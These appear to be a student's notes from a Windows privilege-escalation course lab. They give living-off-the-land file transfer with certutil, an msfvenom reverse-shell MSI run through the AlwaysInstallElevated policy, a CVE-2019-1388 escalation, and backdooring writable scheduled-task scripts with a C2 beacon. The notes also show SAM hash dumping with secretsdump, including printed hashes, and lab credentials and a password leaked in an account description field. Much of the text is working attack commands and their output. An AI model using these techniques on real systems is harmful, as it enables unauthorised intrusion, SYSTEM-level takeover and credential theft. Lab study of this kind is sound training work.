# Miscellaneous Techniques

## Living Off The Land Binaries and Scripts (LOLBAS)

https://lolbas-project.github.io/

### Transferring File with Certutil

https://lolbas-project.github.io/lolbas/Binaries/Certutil/

```
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

### Encoding File with Certutil

```
certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

### Decoding File with Certutil

```
certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

https://lolbas-project.github.io/lolbas/Binaries/Rundll32/ : useful to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

## Always Install Elevated

This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths :

Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer

1) Enumerating Always Install Elevated Settings

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

--> Our enumeration shows us that the AlwaysInstallElevated key exists, so the policy is indeed enabled on the target system.

2) Generating MSI Package

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

3) Executing MSI Package

```
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

4) Catching Shell

```
nc -lnvp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

## CVE-2019-1388

https://nvd.nist.gov/vuln/detail/CVE-2019-1388

Link of list of vulnerable servers and workstations :
https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a

1) Uploading an old-Microsoft-signed executable

https://packetstormsecurity.com/files/14437/hhupd.exe.html

2) Run as administrator

3) Click on Show information about the publisher's certificate

Here we can see that the SpcSpAgencyInfo field is populated in the Details tab.

4) Go back to the General tab and see that the Issued by field is populated with a hyperlink

Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.

5) Open Task Manager, we will see that the browser instance was launched as SYSTEM.

6) Right-click anywhere on the web page and choose View page source and select Save as

7) Type c:\windows\system32\cmd.exe in the file path and hit enter

8) If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

## Scheduled Tasks

### Enumerating Scheduled Tasks witch CMD

```
schtasks /query /fo LIST /v
```

### Enumerating Scheduled Tasks with PowerShell

```
Get-ScheduledTask | select TaskName,State
```

--> By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. 

### Checking Permissions on C:\Scripts Directory

```
.\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

Consider there are scripts in that directory such as db-backup.ps1 which are also all writeable by the BUILTIN\USERS group. 
--> append a snippet of code to one of these files (command to send a beacon back to our C2 infrastructure)
--> the scripts runs on a daily, if not more frequent
--> next morning when we log on, we notice a single beacon as NT AUTHORITY\SYSTEM on the DB01 host

## User/Computer Description Field

### Checking Local User Description Field

```
Get-LocalUser
 
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password
sql_dev         True
```

### Enumerating Computer Description Field with Get-WmiObject Cmdlet

```
Get-WmiObject -Class Win32_OperatingSystem | select Description
 
Description
-----------
The most vulnerable box ever!
```

## Mount VHDX/VMDK

https://github.com/SnaffCon/Snaffler

### Mount VMDK on Linux

```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

### Mount VHD/VHDX on Linux

```
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

### Retrieving Hashes using Secretsdump.py

We can access the C:\Windows\System32\Config directory and pull down the SAM, SECURITY and SYSTEM registry hives.

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)

<SNIP>
```

## LAB

xfreerdp /v:10.129.25.32 /u:htb-student /p:HTB_@cademy_stdnt!

PS C:\Users\htb-student> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
ERROR: The system was unable to find the specified registry key or value.

1) cd c:\Tools

https://packetstormsecurity.com/files/14437/hhupd.exe.html

2) Run as administrator

3) Click on Show information about the publisher's certificate

Here we can see that the SpcSpAgencyInfo field is populated in the Details tab.

4) Go back to the General tab and see that the Issued by field is populated with a hyperlink

Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.

5) Open Task Manager, we will see that the browser instance was launched as SYSTEM.

--> Browser not launched as SYSTEM

c:\>dir /S /B *.vhdx* == *.vhd* == *.vmdk*
File Not Found

c:\>where /R C:\ *.vmdk
INFO: Could not find files for the given pattern(s).

PS C:\Users\htb-student> Get-LocalUser

Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
mrb3n           True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password: !QAZXSW@3edc
sql_dev         True